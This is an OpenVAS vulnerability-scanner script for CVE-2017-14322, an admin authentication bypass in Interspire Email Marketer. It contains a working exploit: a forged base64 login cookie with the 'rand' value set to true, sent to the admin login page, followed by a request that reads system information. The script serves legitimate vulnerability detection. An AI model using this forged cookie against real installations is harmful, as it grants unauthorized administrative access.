###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_interspire_iem_remote_admin_auth_bypass_vuln.nasl 11025 2018-08-17 08:27:37Z cfischer $
#
# Interspire IEM Remote Authentication Admin Bypass Vulnerability
#
# Authors:
# Adrian Steins <adrian.steins@greenbone.net>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, https://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:interspire:iem";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.112087");
  script_version("$Revision: 11025 $");
  script_tag(name:"last_modification", value:"$Date: 2018-08-17 10:27:37 +0200 (Fri, 17 Aug 2018) $");
  script_tag(name:"creation_date", value:"2017-10-19 08:54:12 +0200 (Thu, 19 Oct 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_cve_id("CVE-2017-14322");

  script_name("Interspire IEM Remote Authentication Admin Bypass Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_interspire_iem_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("interspire/iem/installed");

  script_tag(name:"summary", value:"Interspire Email Marketer (IEM) is prone to a remote authentication admin bypass vulnerability.");
  script_tag(name:"vuldetect", value:"This script sends a specially crafted cookie to the web-server that IEM is running to bypass the admin authentication.");
  script_tag(name:"insight", value:"The application creates a login cookie to determine and verify the user/admin.

  A weak consideration of the type during the confirmation of the cookie's parameters causes the application to grant access to an attacker who forged this specific cookie parameter
  by replacing the randomly generated string with just a boolean value ('true').");
  script_tag(name:"impact", value:"Successfully exploiting the vulnerability will grant the attack full administration access to the IEM services on the host system.");
  script_tag(name:"affected", value:"IEM before version 6.1.6");
  script_tag(name:"solution", value:"Upgrade to IEM version 6.1.6 to fix the issue.");

  script_xref(name:"URL", value:"https://security.infoteam.ch/en/blog/posts/narrative-of-an-incident-response-from-compromise-to-the-publication-of-the-weakness.html");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2017/Oct/39");

  exit(0);
}

include("host_details.inc");
include("version_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe:CPE)) exit(0);
if (!dir = get_app_location(cpe:CPE, port:port)) exit(0);

url = dir + "/admin/index.php?Page=&Action=Login";

# forged part of the cookie, encoded to base64: 'a:4:{s:4:"user";s:1:"1";s:4:"time";i:1710477294;s:4:"rand";b:1;s:8:"takemeto";s:9:"index.php";}'
cookie = "IEM_CookieLogin=YTo0OntzOjQ6InVzZXIiO3M6MToiMSI7czo0OiJ0aW1lIjtpOjE3MTA0NzcyOTQ7czo0OiJyYW5kIjtiOjE7czo4OiJ0YWtlbWV0byI7czo5OiJpbmRleC5waHAiO30=";

# additional data that might be required for a valid login
data = "ss_username=admin&ss_password=admin&ss_takemeto=index.php&SubmitButton=Login";

req = http_post_req(port:port, url:url, data:data, add_headers:make_array("Cookie", cookie), accept_header:"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
res = http_keepalive_send_recv(port:port, data:req);

if (res =~ "HTTP/1\.. 200 OK" &&
    ('admin/index.php?Page=Addons&Addon=dbcheck"' >< res || 'admin/index.php?Page=Addons&Addon=checkpermissions' >< res) &&
    ('<div class="loggedinas">' >< res || '<a href="index.php?Page=Logout"' >< res)
   )
{
  # Successfully bypassed the authentication.
  # For further confirmation of the vulnerability a new GET request is being sent to the host in order to obtain crucial system information.

  url = dir + "/admin/index.php?Page=Settings&Action=showinfo";

  req = http_get_req(port:port, url:url, add_headers:make_array("Cookie", cookie), accept_header:"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
  res = http_keepalive_send_recv(port:port, data:req);

  if (res =~ "HTTP/1\.. 200 OK" &&
      (('System' >< res && 'Build Date' >< res) || '<title>phpinfo()</title>' >< res ||
        '<h1>Configuration</h1>' >< res || ('SERVER_ADMIN' >< res && 'SERVER_ADDR' >< res))
     )
  {
    report = "It was possible to bypass the admin authentication and get unrestricted access to the Interspire Email Marketer system.";
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
